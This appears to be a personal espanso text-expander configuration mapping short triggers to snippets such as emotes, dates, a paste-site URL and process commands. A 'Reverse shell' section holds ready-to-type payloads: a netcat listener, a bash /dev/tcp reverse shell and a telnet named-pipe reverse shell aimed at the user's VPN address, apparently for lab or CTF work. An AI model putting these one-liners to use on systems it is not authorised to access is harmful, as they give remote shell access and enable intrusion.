# espanso configuration file

# This is the default configuration file, change it as you like it
# You can refer to the official documentation:
# https://espanso.org/docs/

# Matches are the substitution rules, when you type the "trigger" string
# it gets replaced by the "replace" string.
toggle_key: OFF

matches:
  - trigger: "smorc"
    replace: "SMOrc"

  - trigger: "smha"
    replace: "SMOrc HahaShrugRight"

  # Simple text replacement
  - trigger: ":espanso"
    replace: "Hi there!"

  - trigger: ":paste"
    replace: "paste.debian.net"

  # Reverse shell
  - trigger: ":nc"
    replace: "nc -l -n -vv -p 8080"

  - trigger: ":reverse-bash"
    replace: "/bin/bash -i > /dev/tcp/{{ip}}/8080 0<&1 2>&1"
    vars:
      - name: ip
        type: match
        params:
          trigger: ":vpn"

  - trigger: ":reverse-telnet"
    replace: "mknod backpipe p && telnet {{ip}} 8080 0<backpipe"
    vars:
      - name: ip
        type: match
        params:
          trigger: ":vpn"

  # Dates
  - trigger: ":date"
    replace: "{{mydate}}"
    vars:
      - name: mydate
        type: date
        params:
          format: "%d.%m.%Y"

  # Shell commands
  - trigger: ":shell"
    replace: "{{output}}"
    vars:
      - name: output
        type: shell
        params:
          cmd: "echo Hello from your shell"

  - trigger: ":vpn"
    replace: "{{output}}"
    vars:
      - name: output
        type: shell
        params:
          cmd: ip --json address | jq --raw-output '.[] | select(.ifname == "tapvpn") | .addr_info[] | select(."family" == "inet") | .local'

  - trigger: ":lisp"
    replace: "https://i.redd.it/cp8lwaue6ca51.jpg"

  - trigger: ":pstree"
    replace: "ps -aef --forest"
